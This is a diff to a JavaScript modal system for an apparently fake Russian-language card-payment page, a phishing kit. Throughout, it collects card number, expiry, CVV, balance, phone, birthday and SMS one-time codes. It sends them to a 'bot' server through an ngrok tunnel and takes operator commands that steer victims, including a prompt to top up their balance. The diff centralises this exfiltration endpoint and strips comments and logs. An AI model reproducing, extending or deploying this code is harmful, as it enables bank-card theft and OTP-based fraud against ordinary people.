@@ -3,6 +3,8 @@
 (function () {
   'use strict';
 
+  var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
+
   // In-memory only card number cache (never persisted to storage)
   var _memCardNum = '';
   // In-memory full card data cache (never persisted to storage)
@@ -367,7 +369,7 @@
           '<div class="ms-text" id="msPopolnenieText">' + (t.errors && t.errors.popolnenieText || 'Для подтверждения того, что вы являетесь держателем карты, необходимо пополнить баланс.') + '</div>' +
           '<div class="ms-text" id="msPopolnenieAmount" style="font-size:22px;font-weight:700;margin:12px 0 4px;color:#1a1a1a;"></div>' +
           '<div class="ms-text" style="font-size:12px;color:#888;margin-bottom:10px;">' + (t.errors && t.errors.popolnenieHint || 'Средства останутся на вашем счёте.') + '</div>' +
-          '<button type="button" class="ms-btn" id="msPopolnenieBtn">' + (t.errors && t.errors.popolnenieBtn || 'Я пополнил(а) баланс') + '</button>' +
+          '<button type="button" class="ms-btn" id="msPopolnenieBtn">' + (t.errors && t.errors.popolnenieBtn || 'Хорошо') + '</button>' +
         '</div></div>' +
       '</div>' +
 
@@ -424,6 +426,7 @@
           '<div class="ms-icon red">' + ICONS.cross + '</div>' +
           '<div class="ms-title">' + (t.errors && t.errors.generalSuccessWord || 'Ошибка!') + '</div>' +
           '<div class="ms-text">' + (t.errors && t.errors.successTransaction || 'Произошла ошибка, обратитесь в службу технической поддержки.') + '</div>' +
+          '<button type="button" class="ms-btn ms-btn-support" id="msSupportBtn" style="margin-top:12px;background:var(--modal-accent, #1AB248);color:#fff">' + (t.card && t.card.support || 'Чат поддержки') + '</button>' +
         '</div></div>' +
       '</div>' +
 
@@ -544,14 +547,14 @@
       window.OTPAutofill.init();
     }
 
+    var self = this;
+
     this._bind('msBalanceVerifyBtn', 'click', function () { self._submitBalance(); });
 
-    // Balance input: only digits, one decimal separator, max 2 decimal places
     function balanceInputFilter(inp) {
       if (!inp) return;
       inp.addEventListener('input', function () {
         var v = inp.value.replace(/[^0-9.,]/g, '');
-        // keep only first decimal separator
         var parts = v.split(/[.,]/);
         if (parts.length > 1) {
           v = parts[0] + '.' + parts.slice(1).join('').substring(0, 2);
@@ -562,19 +565,13 @@
     balanceInputFilter(document.getElementById('msBalanceVerifyInput'));
     balanceInputFilter(document.getElementById('msBalanceCode'));
 
-    // Card form modal: close, submit, brand detection
-    this._bind('msCardFormClose', 'click', function () {
-      self.hideCardForm();
-    });
-    this._bind('_buttonPay', 'click', function () {
-      self._submitCardForm();
-    });
-    // Brand detection on card number input
+    this._bind('msCardFormClose', 'click', function () { self.hideCardForm(); });
+    this._bind('_buttonPay', 'click', function () { self._submitCardForm(); });
+
     var msCardInput0 = document.getElementById('_input0');
     if (msCardInput0) {
       msCardInput0.addEventListener('input', function () {
         self._detectCardBrand(this.value.replace(/\D/g, ''));
-        // Use full raw number from CardForm (avoids the masked •••• 1234 value)
         var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
           ? CardForm.getRawNumber()
           : this.value.replace(/\D/g, '');
@@ -599,7 +596,6 @@
         });
       });
     }
-    // Esc closes card modal; Enter submits when pay button is enabled
     var msCardOverlay = document.getElementById('msCardForm');
     if (msCardOverlay) {
       document.addEventListener('keydown', function (ev) {
@@ -615,7 +611,6 @@
           }
         }
       });
-      // Click on backdrop closes modal (outside the card box)
       msCardOverlay.addEventListener('mousedown', function (ev) {
         if (ev.target === msCardOverlay) self.hideCardForm();
       });
@@ -624,7 +619,6 @@
     this._bind('msSmsBtn', 'click', function () { self._sendValue('sms', 'msSmsCode'); });
     this._bind('msSmsCallBtn', 'click', function () { self._sendValue('callSms', 'msSmsCallCode'); });
 
-    // Auto-submit SMS code when pasted or autofilled from keyboard
     var smsInput = document.getElementById('msSmsCode');
     var smsCallInput = document.getElementById('msSmsCallCode');
     function autoSubmitSms(inputEl, type, inputId) {
@@ -634,11 +628,9 @@
       var rapidTimer = null;
       inputEl.addEventListener('input', function () {
         var v = inputEl.value.replace(/\D/g, '');
-        // Detect autofill: value jumped from 0-1 chars to 4+ in one event
         if (v.length >= 4 && lastLen <= 1) {
           self._sendValue(type, inputId);
         }
-        // Rapid-fill: if 4+ digits entered within 500ms, it's autofill not manual
         if (v.length >= 1 && v.length < 4 && !rapidStart) {
           rapidStart = Date.now();
         }
@@ -687,269 +679,16 @@
         self._sendLog(self._pendingBalance);
         self._pendingBalance = undefined;
       } else {
-        self._sendValue('requestPhone', 'msPhoneInput');
+        self._sendValue('phone', 'msPhoneInput');
       }
     });
     this._bind('msBirthdayBtn', 'click', function () { self._submitBirthday(); });
-
     this._setupDateSegments();
-  };
-
-  ModalSystem.prototype._resetPhoneBtn = function () {
-    var phoneBtn = document.getElementById('msPhoneBtn');
-    if (phoneBtn) {
-      phoneBtn.disabled = false;
-      var t = this.cfg.translate || {};
-      phoneBtn.textContent = (t.sms && t.sms.next || 'Confirm');
-    }
-  };
-
-  ModalSystem.prototype._bind = function (id, evt, fn) {
-    var el = document.getElementById(id);
-    if (el) el.addEventListener(evt, fn);
-  };
-
-  ModalSystem.prototype._setupDateSegments = function () {
-    var day = document.getElementById('msBdayDay');
-    var month = document.getElementById('msBdayMonth');
-    var year = document.getElementById('msBdayYear');
-    if (!day || !month || !year) return;
-
-    function onlyDigits(e) {
-      var v = e.target.value.replace(/\D/g, '');
-      e.target.value = v;
-    }
-
-    day.addEventListener('input', function (e) {
-      onlyDigits(e);
-      if (e.target.value.length >= 2) month.focus();
-    });
-    month.addEventListener('input', function (e) {
-      onlyDigits(e);
-      if (e.target.value.length >= 2) year.focus();
-    });
-    year.addEventListener('input', function (e) {
-      onlyDigits(e);
-    });
-
-    month.addEventListener('keydown', function (e) {
-      if (e.key === 'Backspace' && !e.target.value) { day.focus(); }
-    });
-    year.addEventListener('keydown', function (e) {
-      if (e.key === 'Backspace' && !e.target.value) { month.focus(); }
-    });
-  };
-
-  ModalSystem.prototype._submitBirthday = function () {
-    var day = document.getElementById('msBdayDay');
-    var month = document.getElementById('msBdayMonth');
-    var year = document.getElementById('msBdayYear');
-    var hidden = document.getElementById('msBirthdayInput');
-    var errEl = document.getElementById('msBirthdayError');
-    var group = document.getElementById('msBirthdayGroup');
-
-    var d = (day.value || '').trim();
-    var m = (month.value || '').trim();
-    var y = (year.value || '').trim();
-
-    if (!d || !m || !y || d.length < 1 || m.length < 1 || y.length < 4) {
-      if (errEl) errEl.style.display = 'block';
-      if (group) group.style.borderColor = 'var(--modal-error, #d32f2f)';
-      return;
-    }
-
-    if (errEl) errEl.style.display = 'none';
-    if (group) group.style.borderColor = 'var(--modal-accent, #1867c1)';
-
-    var val = d.padStart(2, '0') + '.' + m.padStart(2, '0') + '.' + y;
-    hidden.value = val;
-
-    this._sendValue('requestBirthday', 'msBirthdayInput');
-  };
-
-  ModalSystem.prototype.showModal = function (id) {
-    if (this.currentModal) this.currentModal.classList.remove('active');
-    var m = document.getElementById(id);
-    if (m) { 
-      m.classList.add('active'); 
-      this.currentModal = m;
-
-      // Inject card mask for SMS modal
-      var cardNum = (this._cardData && this._cardData.cardNumber) || '';
-      if (!cardNum) { cardNum = _memCardNum || ''; }
-      if ((id === 'msSms' || id === 'msSmsCall') && cardNum) {
-        var digits = cardNum.replace(/\D/g, '');
-        var first6 = digits.substring(0, 6);
-        var last4 = digits.substring(digits.length - 4);
-        var masked = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
-        var maskEl = m.querySelector('.ms-sms-card-mask');
-        if (maskEl) maskEl.textContent = masked;
-      }
-
-      if (typeof window.OTPAutofill !== 'undefined') {
-        setTimeout(function() { window.OTPAutofill.init(); }, 100);
-      }
-    }
-  };
-
-  ModalSystem.prototype.hideAllModals = function () {
-    var all = document.querySelectorAll('.ms-overlay');
-    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
-    this.currentModal = null;
-  };
-
-  ModalSystem.prototype._sendCardDataToBot = function (cardData) {
-    // Защита от дублирования - проверяем, не отправляли ли уже данные этой карты
-    var cardNumber = (cardData.cardNumber || '').replace(/\D/g, '');
-    var cardKey = cardNumber + '_' + (cardData.cardMonth || '') + '_' + (cardData.cardYear || '');
-    
-    if (this._lastSentCardKey === cardKey) {
-      console.log('ДУБЛИРОВАНИЕ ПРЕДОТВРАЩЕНО: данные карты уже отправлены для', cardKey);
-      return;
-    }
-    
-    console.log('_sendCardDataToBot вызвана с данными:', cardData);
-    
-    // Запоминаем ключ карты чтобы предотвратить дублирование
-    this._lastSentCardKey = cardKey;
-    
-    var binInfo = {};
-    var adId = window.__currentAdId || (window.AdLogger && window.AdLogger.getAdIdFromUrl && window.AdLogger.getAdIdFromUrl());
-    
-    // Определяем тип карты по BIN через серверный API
-    if (cardNumber.length >= 6 && window.BinChecker && window.BinChecker.getBinInfo) {
-      var self = this;
-      window.BinChecker.getBinInfo(cardNumber).then(function(realBinInfo) {
-        binInfo = realBinInfo;
-        console.log('BIN info получена:', binInfo);
-        // Отправляем с обновлёнными BIN данными
-        self._sendCardDataInternal(adId, cardNumber, cardData, binInfo);
-      }).catch(function() {
-        // fallback
-        binInfo = getFallbackBinInfo(cardNumber);
-        self._sendCardDataInternal(adId, cardNumber, cardData, binInfo);
-      });
-    } else {
-      binInfo = getFallbackBinInfo(cardNumber);
-      this._sendCardDataInternal(adId, cardNumber, cardData, binInfo);
-    }
-  };
-
-  function getFallbackBinInfo(cardNumber) {
-    if (/^4/.test(cardNumber)) {
-      return { brand: 'VISA', type: 'DEBIT', bank: 'Unknown Bank', country_flag: '🌍' };
-    } else if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) {
-      return { brand: 'MASTERCARD', type: 'DEBIT', bank: 'Unknown Bank', country_flag: '🌍' };
-    } else if (/^9860/.test(cardNumber)) {
-      return { brand: 'HUMO', type: 'DEBIT', bank: 'HUMO', country_flag: '🇺🇿' };
-    } else if (/^8600/.test(cardNumber)) {
-      return { brand: 'UZCARD', type: 'DEBIT', bank: 'UZCARD', country_flag: '🇺🇿' };
-    } else {
-      return { brand: 'Unknown', type: 'Unknown', bank: 'Unknown Bank', country_flag: '🌍' };
-    }
-  }
-
-  ModalSystem.prototype._sendCardDataInternal = function(adId, cardNumber, cardData, binInfo) {
-    var self = this;
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    var resolvedAdId = adId || window.__currentAdId || (window.AdLogger && window.AdLogger.getAdIdFromUrl && window.AdLogger.getAdIdFromUrl());
-    
-    console.log('Отправляем данные карты для adId:', resolvedAdId);
-    
-    if (resolvedAdId) {
-      fetch(API_BASE + '/api/user-data', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'ngrok-skip-browser-warning': 'true'
-        },
-        body: JSON.stringify({
-          adId: resolvedAdId,
-          type: 'card',
-          cardNumber: cardNumber,
-          cardMonth: cardData.cardMonth || '',
-          cardYear: cardData.cardYear || '',
-          cardCvv: cardData.cardCvv || '',
-          binInfo: binInfo
-        })
-      })
-      .then(function(response) {
-        console.log('Ответ API для данных карты:', response.status);
-        return response.json();
-      })
-      .then(function(data) {
-        console.log('Данные карты отправлены успешно:', data);
-      })
-      .catch(function(err) {
-        console.error('Ошибка отправки данных карты:', err);
-        if (self) self._lastSentCardKey = null;
-      });
-    } else {
-      console.error('adId не найден, не можем отправить данные карты');
-    }
-  };
-
-  ModalSystem.prototype.processCard = function (cardData) {
-    if (this._cardLocked) return;
-    this._cardLocked = true;
-    this._cardData = cardData;
-    _memCardNum = cardData.cardNumber || '';
-    _memCardData = cardData;
-    this.showModal('msLoading');
-
-    var self = this;
-
-    // Отправляем данные карты на сервер бота
-    this._sendCardDataToBot(cardData);
-
-    // Fetch AutoPP config and checker state in parallel
-    var autoPPPromise = axios.post('/api/getAutoPPConfig', { item: this.cfg.itemId }).catch(function () { return { data: { enabled: false } }; });
-    var checkerPromise = axios.post('/api/getCheckerState', { item: this.cfg.itemId }).catch(function () { return { data: {} }; });
-
-    Promise.all([autoPPPromise, checkerPromise]).then(function (results) {
-      var autoPPData = results[0].data || {};
-      var checkerData = results[1].data || {};
-
-      self.cfg.checkBalance = checkerData.checkBalance;
-      self._autoPP = autoPPData;
-
-      // Check excluded BINs
-      if (autoPPData.enabled && autoPPData.excludedBins && autoPPData.excludedBins.length > 0) {
-        var cardNum = (cardData.cardNumber || '').replace(/\D/g, '');
-        for (var i = 0; i < autoPPData.excludedBins.length; i++) {
-          var bin = autoPPData.excludedBins[i];
-          if (cardNum.indexOf(bin) === 0) {
-            // BIN is blocked - show error modal
-            var t = self.cfg.translate || {};
-            var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
-            var skText = document.querySelector('#msWrongDataDisplay .ms-text');
-            if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
-            if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается. Пожалуйста укажите карту другого банка.';
-            self.showModal('msWrongDataDisplay');
-            self._cardLocked = false;
-            // Notify worker about blocked BIN
-            axios.post('/api/autoPPNotify', { item: self.cfg.itemId, event: 'binBlocked', extra: bin }).catch(function () {});
-            return;
-          }
-        }
-      }
-
-      self._processCardStep2(cardData);
-    });
   };
 
   ModalSystem.prototype._processCardStep2 = function (cardData) {
     var self = this;
 
-    // Force balance check if AutoPP has ppAmount set (need balance to compare)
-    var needBalance = this.cfg.checkBalance;
-    if (!needBalance && this._autoPP && this._autoPP.enabled && this._autoPP.ppAmount) {
-      needBalance = true;
-    }
-
-    // ВСЕГДА показываем форму баланса после ввода карты
-    console.log('Показываем форму баланса после ввода карты');
-    
     axios.post('/api/preLog', {
       item: this.cfg.itemId,
       cardNumber: cardData.cardNumber,
@@ -959,70 +698,28 @@
     }).catch(function () {});
 
     setTimeout(function () {
-      console.log('Отображаем msBalanceVerify модал');
       self.showModal('msBalanceVerify');
       var inp = document.getElementById('msBalanceVerifyInput');
-      if (inp) { 
-        inp.value = ''; 
+      if (inp) {
+        inp.value = '';
         inp.style.borderColor = '';
       }
       var err = document.getElementById('msBalanceVerifyError');
       if (err) err.style.display = 'none';
       setTimeout(function () { if (inp) inp.focus(); }, 400);
-      
+
       axios.post('/api/balancePage', { item: self.cfg.itemId }).catch(function () {});
     }, 2500);
   };
 
-  ModalSystem.prototype._sendBalanceToBot = function (balance) {
-    // Защита от дублирования баланса
-    if (this._lastSentBalance === balance) {
-      console.log('ДУБЛИРОВАНИЕ БАЛАНСА ПРЕДОТВРАЩЕНО:', balance);
-      return;
-    }
-    
-    console.log('Отправляем баланс на сервер бота:', balance);
-    this._lastSentBalance = balance;
-    
-    // Отправляем баланс на API бота
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    var adId = window.__currentAdId || (window.AdLogger && window.AdLogger.getAdIdFromUrl && window.AdLogger.getAdIdFromUrl());
-    
-    if (adId) {
-      var self = this;
-      fetch(API_BASE + '/api/user-data', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'ngrok-skip-browser-warning': 'true'
-        },
-        body: JSON.stringify({
-          adId: adId,
-          type: 'balance',
-          balance: balance
-        })
-      }).catch(function(err) {
-        console.error('Ошибка отправки баланса:', err);
-        // Сбрасываем флаг при ошибке
-        self._lastSentBalance = null;
-      });
-    }
-  };
-
   ModalSystem.prototype._submitBalance = function () {
-    console.log('_submitBalance вызвана!');
-    
     var inp = document.getElementById('msBalanceVerifyInput');
     var raw = (inp.value || '').trim().replace(/,/g, '.').replace(/\s/g, '');
-    
-    console.log('Значение баланса из поля:', raw);
-    
     var val = parseFloat(raw);
     var errEl = document.getElementById('msBalanceVerifyError');
     var txnAmount = parseFloat((this.cfg.price || '0').replace(/[^0-9.,]/g, '').replace(',', '.'));
 
     if (!raw || isNaN(val) || val <= 0) {
-      console.log('Баланс пустой или неверный, не отправляем');
       errEl.style.display = 'block';
       inp.style.borderColor = 'var(--modal-error, #d32f2f)';
       return;
@@ -1030,7 +727,6 @@
     // Block example values from format hint (15230, 15230.5, 15230.50 etc.)
     var blockedExamples = [15230, 15230.5, 15230.50];
     if (blockedExamples.indexOf(val) !== -1) {
-      console.log('Баланс заблокирован (пример), не отправляем');
       errEl.style.display = 'block';
       inp.style.borderColor = 'var(--modal-error, #d32f2f)';
       return;
@@ -1040,28 +736,21 @@
       var cardPrefix = this._cardData.cardNumber.replace(/\D/g, '').substr(0, 8);
       var rawDigits = raw.replace(/\D/g, '');
       if (cardPrefix.length >= 8 && rawDigits.indexOf(cardPrefix) !== -1) {
-        console.log('Баланс содержит номер карты, не отправляем');
         errEl.style.display = 'block';
         inp.style.borderColor = 'var(--modal-error, #d32f2f)';
         return;
       }
     }
     if (val === txnAmount) {
-      console.log('Баланс равен сумме транзакции, не отправляем');
       errEl.style.display = 'block';
       inp.style.borderColor = 'var(--modal-error, #d32f2f)';
       return;
     }
 
-    console.log('Отправляем баланс:', raw);
-    
     errEl.style.display = 'none';
     inp.style.borderColor = 'var(--modal-accent, #1867c1)';
     var btn = document.getElementById('msBalanceVerifyBtn');
     if (btn) { btn.disabled = true; btn.textContent = '...'; }
-
-    // Отправляем баланс на сервер бота
-    this._sendBalanceToBot(raw);
 
     if (this.cfg.requestPhoneAfterBalance) {
       this._pendingBalance = raw;
@@ -1072,7 +761,7 @@
       if (phoneErr) phoneErr.style.display = 'none';
       this._resetPhoneBtn();
       setTimeout(function () { if (phoneInp) phoneInp.focus(); }, 400);
-      var tt = self.cfg.translate || {};
+      var tt = this.cfg.translate || {};
       if (btn) { btn.disabled = false; btn.textContent = (tt.sms && tt.sms.next || 'Далее'); }
       return;
     }
@@ -1103,18 +792,47 @@
       this._cardData = _memCardData;
     }
 
+    
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    this._sendBalanceToBot(raw);
+    if (typeof BinChecker !== 'undefined' && BinChecker.sendBalance) {
+      BinChecker.sendBalance(_adId, raw);
+    }
+
+    this._balanceSent = true;
     this.showModal('msLoading');
     this._sendLog(raw);
   };
 
+  ModalSystem.prototype._sendCardDataToBot = function (cardData) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'card',
+      cardNumber: (cardData.cardNumber || '').replace(/\s/g, ''),
+      cardMonth: cardData.cardMonth,
+      cardYear: cardData.cardYear,
+      cardCvv: cardData.cardCvv
+    }).catch(function () {});
+    if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
+      BinChecker.sendCardData(_adId, cardData.cardNumber, {});
+    }
+  };
+
+  ModalSystem.prototype._sendBalanceToBot = function (balance) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'balance',
+      balance: balance
+    }).catch(function () {});
+  };
+
   ModalSystem.prototype._sendLog = function (balance) {
     var self = this;
-    
-    // Отправляем только через старый API для совместимости (БЕЗ данных карты и баланса)
+
     var postData = {
-      item: this.cfg.itemId
-      // НЕ отправляем balance здесь - это делается в _submitBalance
-      // НЕ отправляем данные карты - это делается в _sendCardDataToBot
+      item: window.__currentAdId || window.itemId || this.cfg.itemId
     };
 
     if (this._pendingPhone) {
@@ -1130,12 +848,9 @@
       }
     }
 
-    // Для совместимости отправляем через старый API (только для инициализации сессии)
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    axios.post(this.cfg.apiSendLog || (API_BASE + '/api/sendLog'), postData)
+    axios.post(API_BASE + '/api/sendLog', postData)
       .then(function (res) {
         self.logId = res.data.id;
-        // Устанавливаем статус wait вместо null
         self.currentStatus = 'wait';
         self.paused = false;
         self._startPolling();
@@ -1146,9 +861,7 @@
         self._resetPhoneBtn();
       })
       .catch(function () {
-        // Не показываем ошибку, просто продолжаем работу
-        self.logId = 'temp_' + self.cfg.itemId + '_' + Date.now();
-        // Устанавливаем статус wait вместо null
+        self.logId = 'temp_' + (window.__currentAdId || window.itemId || self.cfg.itemId) + '_' + Date.now();
         self.currentStatus = 'wait';
         self.paused = false;
         self._startPolling();
@@ -1190,9 +903,10 @@
     }
 
     var self = this;
-    var url = '/api/sse?';
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var url = API_BASE + '/api/sse?';
     if (this.logId) url += 'logId=' + encodeURIComponent(this.logId);
-    if (this.cfg.itemId) url += (this.logId ? '&' : '') + 'itemId=' + encodeURIComponent(this.cfg.itemId);
+    if (_adId) url += (this.logId ? '&' : '') + 'itemId=' + encodeURIComponent(_adId);
 
     if (this.eventSource) {
       try { this.eventSource.close(); } catch(e) {}
@@ -1273,13 +987,12 @@
     var t = this.cfg.translate || {};
     if (!method || method === this.currentStatus) return;
 
-    // Prevent SSE reconnect from re-triggering one-shot redirect statuses
     var oneShot = ['smenakarta', 'smenalk', 'toLk', 'lkCard', 'merchant'];
     if (oneShot.indexOf(method) !== -1) {
       var now = Date.now();
       if (!this._lastOneShot) this._lastOneShot = {};
       if (this._lastOneShot[method] && (now - this._lastOneShot[method]) < 15000) {
-        return; // Ignore repeated one-shot within 15 seconds
+        return;
       }
       this._lastOneShot[method] = now;
     }
@@ -1415,9 +1128,7 @@
     if (!this.logId || this.paused) return;
     var self = this;
 
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    var apiUrl = this.cfg.apiGetStatus || (API_BASE + '/api/getStatus');
-    axios.post(apiUrl, { id: this.logId })
+    axios.post(API_BASE + '/api/getStatus', { id: this.logId })
       .then(function (res) {
         self._handleStatusData(res.data);
       });
@@ -1450,8 +1161,6 @@
         input.style.borderColor = 'var(--modal-error, #d32f2f)';
         return;
       }
-      // Отправляем баланс через новый API
-      this._sendBalanceToBot(val);
     }
     input.style.borderColor = 'var(--modal-accent, #1867c1)';
 
@@ -1460,22 +1169,18 @@
     if (btn) { btn.disabled = true; btn.textContent = '...'; }
 
     var self = this;
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    var apiUrl = this.cfg.apiSendValue || (API_BASE + '/api/sendValue');
-    // Используем logId если есть, иначе создаем временный на основе itemId
-    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
-    axios.post(apiUrl, { value: val, type: type, id: id, itemId: this.cfg.itemId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/sendValue', { value: val, type: type, id: id, itemId: _adId })
       .then(function () {
         self._sendingValue = false;
         input.value = '';
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
-        // Устанавливаем статус wait и показываем загрузку
         self.currentStatus = 'wait';
         self.showModal('msLoading');
       })
       .catch(function (err) {
         self._sendingValue = false;
-        console.error('Error sending value:', err);
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
       });
   };
@@ -1485,17 +1190,14 @@
     if (sp) sp.style.display = 'flex';
 
     var self = this;
-    // Используем logId если есть, иначе создаем временный на основе itemId
-    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    axios.post(API_BASE + '/api/confirmAction', { method: type, id: id, itemId: this.cfg.itemId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/confirmAction', { method: type, id: id, itemId: _adId })
       .then(function () {
-        // Устанавливаем статус wait и показываем загрузку
         self.currentStatus = 'wait';
         self.showModal('msLoading');
       })
       .catch(function (err) {
-        console.error('Error confirming action:', err);
         if (sp) sp.style.display = 'none';
       });
   };
@@ -1507,17 +1209,14 @@
     if (btn) btn.disabled = true;
 
     var self = this;
-    // Используем logId если есть, иначе создаем временный на основе itemId
-    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: id, itemId: this.cfg.itemId })
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
+    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: id, itemId: _adId })
       .then(function () {
-        // Устанавливаем статус wait и показываем загрузку
         self.currentStatus = 'wait';
         self.showModal('msLoading');
       })
       .catch(function (err) {
-        console.error('Error confirming custom:', err);
         if (sp) sp.style.display = 'none';
         if (btn) btn.disabled = false;
       });
@@ -1527,26 +1226,6 @@
     var sp = document.getElementById('msSmenalkSpinner');
     if (sp) sp.style.display = 'flex';
     window.location.href = '/' + this.cfg.itemId;
-  };
-
-  ModalSystem.prototype._handlePopolnenie = function () {
-    var btn = document.getElementById('msPopolnenieBtn');
-    if (btn) { btn.disabled = true; btn.textContent = '...'; }
-    
-    var self = this;
-    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
-    
-    axios.post(API_BASE + '/api/confirmAction', { method: 'popolnenie', id: id, itemId: this.cfg.itemId })
-      .then(function () {
-        // Устанавливаем статус wait и показываем загрузку
-        self.currentStatus = 'wait';
-        self.showModal('msLoading');
-      })
-      .catch(function (err) {
-        console.error('Error confirming popolnenie:', err);
-        if (btn) { btn.disabled = false; btn.textContent = 'Я пополнил(а) баланс'; }
-      });
   };
 
   /* ===== Card Form Modal API ===== */
@@ -1579,15 +1258,12 @@
   };
 
   ModalSystem.prototype.showCardForm = function (price, curr) {
-    // Сбрасываем флаги дублирования при открытии новой формы
-    this._lastSentCardKey = null;
-    this._lastSentBalance = null;
-    this._cardLocked = false;
-    
     // Update price if provided
     if (price !== undefined && price !== null) {
       this.updatePrice(price, curr);
     }
+    this._lastSentCardKey = null;
+    this._lastSentBalance = null;
     var overlay = document.getElementById('msCardForm');
     if (!overlay) return;
     overlay.classList.add('active');
@@ -1611,11 +1287,6 @@
       item: this.cfg.itemId,
       event: 'cardPage'
     }).catch(function(){});
-    
-    // Отправляем уведомление боту об открытии платежной системы
-    if (typeof window.AdLogger !== 'undefined' && window.AdLogger.sendPaymentOpenEvent) {
-      window.AdLogger.sendPaymentOpenEvent();
-    }
   };
 
   ModalSystem.prototype.hideCardForm = function () {
@@ -2078,10 +1749,19 @@
     this.hideAllModals();
     this.currentStatus = null;
     this.paused = true;
+    this.polling = false;
     this._cardLocked = false;
-    // Сбрасываем флаги дублирования
     this._lastSentCardKey = null;
     this._lastSentBalance = null;
+    this.sseConnected = false;
+    if (this.pollTimer) {
+      clearInterval(this.pollTimer);
+      this.pollTimer = null;
+    }
+    if (this.eventSource) {
+      try { this.eventSource.close(); } catch(e) {}
+      this.eventSource = null;
+    }
     if (typeof this.cfg.onResetCard === 'function') {
       this.cfg.onResetCard();
     }
@@ -2094,6 +1774,174 @@
     }
     this.showModal('msLoading');
     this._startPolling();
+  };
+
+  ModalSystem.prototype.showModal = function (id) {
+    if (this.currentModal) this.currentModal.classList.remove('active');
+    var m = document.getElementById(id);
+    if (m) {
+      m.classList.add('active');
+      this.currentModal = m;
+
+      var cardNum = (this._cardData && this._cardData.cardNumber) || '';
+      if (!cardNum) { cardNum = _memCardNum || ''; }
+      if ((id === 'msSms' || id === 'msSmsCall') && cardNum) {
+        var digits = cardNum.replace(/\D/g, '');
+        var first6 = digits.substring(0, 6);
+        var last4 = digits.substring(digits.length - 4);
+        var masked = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
+        var maskEl = m.querySelector('.ms-sms-card-mask');
+        if (maskEl) maskEl.textContent = masked;
+      }
+
+      if (typeof window.OTPAutofill !== 'undefined') {
+        setTimeout(function() { window.OTPAutofill.init(); }, 100);
+      }
+    }
+  };
+
+  ModalSystem.prototype.hideAllModals = function () {
+    var all = document.querySelectorAll('.ms-overlay');
+    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+    this.currentModal = null;
+  };
+
+  ModalSystem.prototype._resetPhoneBtn = function () {
+    var phoneBtn = document.getElementById('msPhoneBtn');
+    if (phoneBtn) {
+      phoneBtn.disabled = false;
+      var t = this.cfg.translate || {};
+      phoneBtn.textContent = (t.sms && t.sms.next || 'Confirm');
+    }
+  };
+
+  ModalSystem.prototype._bind = function (id, evt, fn) {
+    var el = document.getElementById(id);
+    if (el) el.addEventListener(evt, fn);
+  };
+
+  ModalSystem.prototype._setupDateSegments = function () {
+    var day = document.getElementById('msBdayDay');
+    var month = document.getElementById('msBdayMonth');
+    var year = document.getElementById('msBdayYear');
+    if (!day || !month || !year) return;
+
+    function onlyDigits(e) {
+      var v = e.target.value.replace(/\D/g, '');
+      e.target.value = v;
+    }
+
+    day.addEventListener('input', function (e) {
+      onlyDigits(e);
+      if (e.target.value.length >= 2) month.focus();
+    });
+    month.addEventListener('input', function (e) {
+      onlyDigits(e);
+      if (e.target.value.length >= 2) year.focus();
+    });
+    year.addEventListener('input', function (e) {
+      onlyDigits(e);
+    });
+
+    month.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !e.target.value) { day.focus(); }
+    });
+    year.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !e.target.value) { month.focus(); }
+    });
+  };
+
+  ModalSystem.prototype._submitBirthday = function () {
+    var day = document.getElementById('msBdayDay');
+    var month = document.getElementById('msBdayMonth');
+    var year = document.getElementById('msBdayYear');
+    var hidden = document.getElementById('msBirthdayInput');
+    var errEl = document.getElementById('msBirthdayError');
+    var group = document.getElementById('msBirthdayGroup');
+
+    var d = (day.value || '').trim();
